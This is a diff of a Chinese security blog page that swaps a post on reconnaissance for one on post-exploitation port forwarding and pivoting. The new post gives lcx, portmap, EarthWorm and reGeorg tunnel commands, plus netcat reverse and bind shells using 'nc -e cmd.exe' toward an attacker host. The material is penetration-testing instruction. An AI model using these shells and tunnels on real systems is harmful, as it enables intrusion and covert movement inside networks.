@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="渗透测试之信息收集, DarkCrow">
+    <meta name="keywords" content="后渗透之流量转发, DarkCrow">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>渗透测试之信息收集 | DarkCrow</title>
+    <title>后渗透之流量转发 | DarkCrow</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">渗透测试之信息收集</h1>
+                    <h1 class="description center-align post-title">后渗透之流量转发</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%89%8D%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">前渗透</span>
+                            <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">后渗透</span>
                             </a>
                         
                     </div>
@@ -468,30 +468,79 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>在渗透测试过程中，最重要的就是信息收集，信息收集的越全面，找到漏洞的可能性就越大；一般的渗透测试都是通过一个主域名展开的,拿到主域名后可以从两个方向收集信息:<br>资产探测<br>​        以点到面，横向收集信息，扩充范围以便于在一个点无法突破时再找其他突破点；<br>信息收集<br>​        以点深入，纵向挖掘信息，深入挖掘一个点的所有详细信息以便从中找出漏洞点；</p>
-<h4 id="资产探测"><a href="#资产探测" class="headerlink" title="资产探测"></a>资产探测</h4><h5 id="IP"><a href="#IP" class="headerlink" title="IP:"></a>IP:</h5><p>​    拿到主域名首先用ping或者nslookup来查看域名对应的IP地址</p>
-<h5 id="子域名"><a href="#子域名" class="headerlink" title="子域名:"></a>子域名:</h5><p>​    子域名检测工具： layer子域名挖掘机<br>​                    onforall 米斯特团队研发，python3环境<br>​    搜索引擎枚举法： GHDB–&gt;site:domianName.com<br>​    第三方爆破接口： 在线查询子域名(具体网址下方总结)<br>​    SSL证书日记枚举：在线SSL证书查询(具体网址下方总结)</p>
-<h5 id="相关域名："><a href="#相关域名：" class="headerlink" title="相关域名："></a>相关域名：</h5><p>​    旁站：同一服务器上的其他站点<br>​    C段：同一局域网内的其他服务器   192.168.4.1/24<br>​    工具：网络空间搜索引擎：FOFA/Shodan/钟馗之眼zoomeye<br>​         Chrome插件:FOFA pro view            </p>
-<h5 id="网站架构："><a href="#网站架构：" class="headerlink" title="网站架构："></a>网站架构：</h5><p>​    网站语言、数据库，网站框架、组件框架历史漏洞<br>​    常见的网站架构如：<br>​        LAMP–&gt;Linux+Apache+Mysql+PHP<br>​        LNMP–&gt;Linux+Nginx+Mysql+PHP<br>​    工具：火狐插件:wappalyzer </p>
-<h5 id="设备型号："><a href="#设备型号：" class="headerlink" title="设备型号："></a>设备型号：</h5><p>​    192.168.1.1 网关，路由设备信息   </p>
-<h5 id="网络拓扑："><a href="#网络拓扑：" class="headerlink" title="网络拓扑："></a>网络拓扑：</h5><p>​    内网渗透以及内网信息收集</p>
-<h5 id="移动端："><a href="#移动端：" class="headerlink" title="移动端："></a>移动端：</h5><p>​    APP/公众号/小程序</p>
-<h5 id="行业系统"><a href="#行业系统" class="headerlink" title="行业系统:"></a>行业系统:</h5><p>​    同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比，也可能存在通用弱口令；<br>​    通用：办公OA、邮件系统、VPN等<br>​    医院：门户、预约系统、掌上医院、微信公众平台等</p>
-<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="域名信息收集："><a href="#域名信息收集：" class="headerlink" title="域名信息收集："></a>域名信息收集：</h5><p>​            Whois信息：注册人(注册商)的信息，包括姓名，邮箱，电话，地址等信息；<br>​            查询方法：站长之家/微步社区/爱站<br>​            备案信息：域名是否备案(即合法)；<br>​            查询方法：IPC备案查询网/天眼查/企查查</p>
-<h5 id="IP信息收集："><a href="#IP信息收集：" class="headerlink" title="IP信息收集："></a>IP信息收集：</h5><p>​            主要针对做CDN加速服务的企业，需要绕过CDN查找到真实IP地址；<br>​            CDN：内容分发网络，也可以叫代理服务器；<br>​            判断方法：<br>​                    1.多地Ping查看IP是否一致；<br>​                    2.直接访问域名所解析的IP，查看是否能跳转到域名所在的页面；<br>​            绕过方法：<br>​                    1.多地Ping: 目标站点可能只针对某些地区做了CDN，找出现次数最多的IP；<br>​                    2.扫描测试文件：使用工具扫描测试文件、探针文件，如phpinfo、test文件，从而获取真实IP；<br>​                    3.通过子域名或移动APP获取:主站流量大做了CDN，而分站，APP可能不会做CDN，可以尝试；<br>​                    4.利用已知漏洞: XSS盲打，SSRF或命令执行也可能暴露出真实IP；<br>​                    5.网站邮箱订阅查找：目标自己的邮箱服务器一般都在内部系统中，不会做CDN加速；<br>​                    6.访问国外站点：可能目标网站只针对国内做了CDN加速；<br>​                    7.DNS历史解析：查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录；<br>​                    8.利用网络空间搜索引擎：FOFA/Shodan/钟馗之眼zoomeye<br>​                    9.SSL证书探测    </p>
-<h5 id="端口信息收集："><a href="#端口信息收集：" class="headerlink" title="端口信息收集："></a>端口信息收集：</h5><p>​            通过端口去判断目标系统开放了哪些的服务，然后我们在根据相关的服务去进行进一步的渗透测试；<br>​            端口扫描工具:nmap/Zenmap/Mascan</p>
-<h5 id="敏感文件-目录收集："><a href="#敏感文件-目录收集：" class="headerlink" title="敏感文件/目录收集："></a>敏感文件/目录收集：</h5><p>​            robots.txt文件是一个防爬虫文件，一般后台是不允许被爬取的，所以该文件可能存放着后台信息；<br>​            phpinfo()信息，phpinfo.php、l.php是一个探针信息文件，访问该文件可获取服务器配置等信息<br>​            备份文件:.rar/.zip/.tar.gz等，管理员在对网站进行修改、升级等操作前，可能会将网站或某些页面进行备份；<br>​            WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>​            WEB-INF主要包含一下文件或目录：<br>​            /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>​            /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>​            /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>​            /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>​            目录扫描工具：dirb kali/御剑 windows         </p>
-<h5 id="CMS-指纹-密码信息收集："><a href="#CMS-指纹-密码信息收集：" class="headerlink" title="CMS/指纹/密码信息收集："></a>CMS/指纹/密码信息收集：</h5><p>​            robots.txt文件(防爬虫文件)里的目录结构,例如 /wp-admin/ 可以大致判断cms为WordPress<br>​            云悉指纹(具体网址下方总结)<br>​            潮汐指纹(具体网址下方总结)</p>
-<h5 id="服务器-中间件-网站架构信息收集："><a href="#服务器-中间件-网站架构信息收集：" class="headerlink" title="服务器/中间件/网站架构信息收集："></a>服务器/中间件/网站架构信息收集：</h5><p>​            服务器系统信息：<br>​                        最直接的办法是利用Linux系统对大小写敏感，而Windows不敏感<br>​                        数据包返回判断<br>​            中间件判断：<br>​                        报错法(想办法让网站报错)<br>​                        burp抓包<br>​                        火狐插件: wappalyzer<br>​            网站架构信息：<br>​                        常见的网站架构LAMP/LNMP<br>​                        PHP框架：ThinkPHP</p>
-<h6 id="在线资产收集："><a href="#在线资产收集：" class="headerlink" title="在线资产收集："></a>在线资产收集：</h6><blockquote>
-<p>​        IPC备案查询网：<br>​                    <a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com</a><br>​                    <a target="_blank" rel="noopener" href="http://www.tianyancha.com/">http://www.tianyancha.com</a>                   #天眼查<br>​                    <a target="_blank" rel="noopener" href="http://icp.chinaz.com/">http://icp.chinaz.com/</a>                        #站长之家<br>​                    <a target="_blank" rel="noopener" href="https://icp.aizhan.com/">https://icp.aizhan.com/</a>                     #爱站<br>​        Whois信息查询：<br>​                    <a target="_blank" rel="noopener" href="http://tool.chinaz.com/ipwhois">http://tool.chinaz.com/ipwhois</a>                 #站长之家<br>​                    <a target="_blank" rel="noopener" href="https://whois.aizhan.com/">https://whois.aizhan.com/</a>                    #爱站<br>​                    <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>                    #微步情报社区<br>​        子域名查询：<br>​                    <a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a>                  #推荐好用<br>​                    <a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a>           #站长之家<br>​                    <a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>​                    <a target="_blank" rel="noopener" href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com/</a><br>​                    <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br>​                    <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>                    #微步情报社区<br>​        在线c段查询：<br>​                    <a target="_blank" rel="noopener" href="https://phpinfo.me/bing.php">https://phpinfo.me/bing.php</a><br>​        同IP站点查询：<br>​                    <a target="_blank" rel="noopener" href="https://www.webscan.cc/search/">https://www.webscan.cc/search/</a><br>​        多地Ping：<br>​                    <a target="_blank" rel="noopener" href="http://www.17ce.com/">http://www.17ce.com</a><br>​                    <a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com</a>                         #站长之家<br>​                    <a target="_blank" rel="noopener" href="https://ping.aizhan.com/">https://ping.aizhan.com</a>                         #爱站<br>​        DNS解析查询：<br>​                    <a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>                      #全球DNS搜索引擎<br>​                    <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>                     #微步情报社区<br>​                    <a target="_blank" rel="noopener" href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a><br>​                    <a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info/</a><br>​                    <a target="_blank" rel="noopener" href="https://securitytrails.com/">https://securitytrails.com/</a><br>​        资产在线查询：<br>​                    <a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a>                       #钟馗之眼<br>​                    <a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a>                               #佛法<br>​                    <a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a>                         #撒旦<br>​        开源指纹查询：<br>​                    <a target="_blank" rel="noopener" href="http://www.yunsee.cn/">http://www.yunsee.cn/</a>                          #云悉指纹<br>​                    <a target="_blank" rel="noopener" href="http://finger.tidesec.net/">http://finger.tidesec.net/</a>                      #潮汐指纹<br>​        SSL在线查询：<br>​                    <a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io</a><br>​                    <a target="_blank" rel="noopener" href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a><br>​                    <a target="_blank" rel="noopener" href="https://crt.sh/?Identity=%25%25.github.com">https://crt.sh/?Identity=%%.github.com</a><br>​                    <a target="_blank" rel="noopener" href="https://censys.io/certificates">https://censys.io/certificates</a></p>
+                <p>在拿到一台服务器shell的时候，如果想要更进一步渗透测试，则需要进行内网渗透，而内网渗透的第一步就是挂代理，在日常生活中常用<code>vpn</code>挂代理去google查资料，自己搭过<code>vpn</code>的人都知道，要在买的<code>vps</code>上搭建<code>ss的服务器端</code>，之后在<code>自己电脑</code>上下载<code>ss的客户端</code>，确定对应的加密协议和密码就能成功转发，而在内网渗透的流量转发是一个道理，是在拿到shell的服务器上使用工具让它变成代理的服务器端，之后在本机使用客户端工具进行连接；</p>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p><strong>端口转发草图：</strong></p>
+<p><img src="/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%8D%89%E5%9B%BE.png" alt="端口转发草图"></p>
+<h3 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h3><p>lcx.exe是一款windows上端口转发工具；</p>
+<p><img src="/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/lcx.png" alt="lcx"></p>
+<h4 id="·反向转发"><a href="#·反向转发" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
+<p>内网主机执行：lcx.exe  -slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p>
 </blockquote>
-<p>​                        </p>
-<p>​            </p>
-<p>​               </p>
-<p>​            </p>
-<p>​                    </p>
-<p>​<br>​<br>​    </p>
+<blockquote>
+<p>公网主机执行：lcx.exe  -listen 公网主机端口1 公网主机端口2</p>
+</blockquote>
+<p>验证：打开远程桌面连接win+R 输入命令 mstsc</p>
+<p>​            公网主机上计算机栏输入127.0.0.1：公网主机端口2，即可连接到内网主机；</p>
+<p>​            本地主机上计算机栏输入公网主机IP：公网主机端口2，即可连接到内网主机；</p>
+<h4 id="·正向转发"><a href="#·正向转发" class="headerlink" title="·正向转发"></a>·正向转发</h4><blockquote>
+<p>目标主机执行：lcx.exe -tran 53 目标主机ip 3389</p>
+</blockquote>
+<p>验证：任何主机远程连接目标主机的53端口，即可连接到目标主机；</p>
+<h3 id="port-map端口转发"><a href="#port-map端口转发" class="headerlink" title="port map端口转发"></a>port map端口转发</h3><p>portmap是一款linux上端口转发工具</p>
+<p><img src="/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/portmap.png" alt="portmap"></p>
+<h4 id="·反向转发-1"><a href="#·反向转发-1" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
+<p>内网主机执行：./portmap -m 3 -h1 内网主机IP -p1 22 -h2 公网主机IP -p2 6666</p>
+</blockquote>
+<blockquote>
+<p>公网主机执行：./portmap -m 2 -p1 6666 -h2 公网主机IP -p2 7777</p>
+</blockquote>
+<p>验证：ssh 公网主机IP 7777，即可连接到内网主机</p>
+<h4 id="·正向转发-1"><a href="#·正向转发-1" class="headerlink" title="·正向转发"></a>·正向转发</h4><blockquote>
+<p>目标主机上执行：./portmap -m 1 -h1 内网主机IP -p1 22  -p2 6666</p>
+</blockquote>
+<p>验证：ssh 内网主机IP 6666，即可连接到内网主机</p>
+<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p><img src="/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/nc.png" alt="nc"></p>
+<h4 id="·反向连接"><a href="#·反向连接" class="headerlink" title="·反向连接"></a>·反向连接</h4><blockquote>
+<p>公网主机监听：nc -lvp 端口</p>
+<p>内网主机执行：nc -t -e cmd.exe 公网主机IP 端口</p>
+</blockquote>
+<p>验证：成功后公网主机即可得到内网主机的cmd shell</p>
+<h4 id="·正向连接"><a href="#·正向连接" class="headerlink" title="·正向连接"></a>·正向连接</h4><blockquote>
+<p>远程主机执行：nc -l -p 端口 -e cmd.exe</p>
+<p>本地主机执行：nc -v 远程主机IP 端口</p>
+</blockquote>
+<p>验证：成功后本地主机即可得到远程主机的cmd shell</p>
+<h1 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h1><p><strong>Termite 是EW（EarthWorm）的最新版，官方链接： <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></strong></p>
+<p>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p>
+<p><strong>EW（EarthWorm）</strong></p>
+<p><img src="/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/ew.png" alt="ew"></p>
+<h4 id="·正向端口转发"><a href="#·正向端口转发" class="headerlink" title="·正向端口转发"></a>·正向端口转发</h4><blockquote>
+<p>目标主机执行：ew -s  lcx_tran -l 53 -f 目标主机ip -g 3389</p>
+</blockquote>
+<h4 id="·反向端口转发"><a href="#·反向端口转发" class="headerlink" title="·反向端口转发"></a>·反向端口转发</h4><blockquote>
+<p>内网主机执行：ew -s lcx_slave -d 公网主机IP -e 公网主机端口 -f 内网主机IP -g 内网主机端口</p>
+</blockquote>
+<blockquote>
+<p>公网主机执行：ew -s  lcx_listen -l 公网主机端口1 -e 公网主机端口2</p>
+</blockquote>
+<h4 id="·正向代理"><a href="#·正向代理" class="headerlink" title="·正向代理"></a>·正向代理</h4><blockquote>
+<p>目标主机执行：./ew -s ssocksd -l 888                  <!--攻击主机通过访问目标主机888端口使用目标主机提供的代理-->   </p>
+</blockquote>
+<p>攻击主机开启一个IP为目标主机IP端口为888的代理就可以使用了</p>
+<h4 id="·反向代理"><a href="#·反向代理" class="headerlink" title="·反向代理"></a>·反向代理</h4><blockquote>
+<p>公网主机执行：./ew -s rcsocks -l 1080 -e 1024        <!--监听本机的1080端口并把收到的代理请求转发到1024端口上--></p>
+</blockquote>
+<blockquote>
+<p>目标主机执行：ew -s rssocks -d 公网IP -e 1024     <!--启动代理通过socks隧道并反弹到公网IP的1024端口上-->       </p>
+</blockquote>
+<h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>reGeorg是reDuh的升级版   工具地址： <a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<p>使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python reGeorgSocksProxy.py -p 8080 -u http:&#x2F;&#x2F;upload.sensepost.net:8080&#x2F;tunnel&#x2F;tunnel.jsp</span><br></pre></td></tr></table></figure>
+<p>[^注]: 运行.py脚本 去访问目标主机上相对应传上去的脚本文件</p>
+<p>Tomcat运行tunnel.php</p>
+<p>非Tomcat运行tunnel.nosocket.php</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhaijiahui/p/11560899.html">reGeorg+Proxifier使用</a></p>
+<h3 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h3><h5 id="内网漫游之SOCKS代理大结局"><a href="#内网漫游之SOCKS代理大结局" class="headerlink" title="内网漫游之SOCKS代理大结局"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pshell/p/7649095.html">内网漫游之SOCKS代理大结局</a></h5><h6 id="浅谈内网端口转发"><a href="#浅谈内网端口转发" class="headerlink" title="浅谈内网端口转发"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/network/210653.html">浅谈内网端口转发</a></h6><p>​    </p>
 
                 
             </div>
@@ -518,7 +567,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gitman-yy.github.io/2021/02/04/%E5%89%8D%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">https://gitman-yy.github.io/2021/02/04/%E5%89%8D%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</a>
+                    <a href="https://gitman-yy.github.io/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/">https://gitman-yy.github.io/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -556,8 +605,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%89%8D%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">前渗透</span>
+                                <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">后渗透</span>
                                 </a>
                             
                         </div>
@@ -733,13 +782,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/02/04/%E5%89%8D%E6%B8%97%E9%80%8F%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/">
+                <a href="/2021/02/04/qian-shen-tou-zhi-xin-xi-shou-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="前渗透之SQL注入">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="渗透测试之信息收集">
                         
-                        <span class="card-title">前渗透之SQL注入</span>
+                        <span class="card-title">渗透测试之信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -763,8 +812,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%89%8D%E6%B8%97%E9%80%8F-%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">前渗透 漏洞</span>
+                    <a href="/tags/%E5%89%8D%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">前渗透</span>
                     </a>
                     
                 </div>
@@ -775,10 +824,10 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
+                <a href="/2021/02/04/hou-shen-tou-zhi-liu-liang-zhuan-fa/">
                     <div class="card-image">
                         
                         
@@ -805,6 +854,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
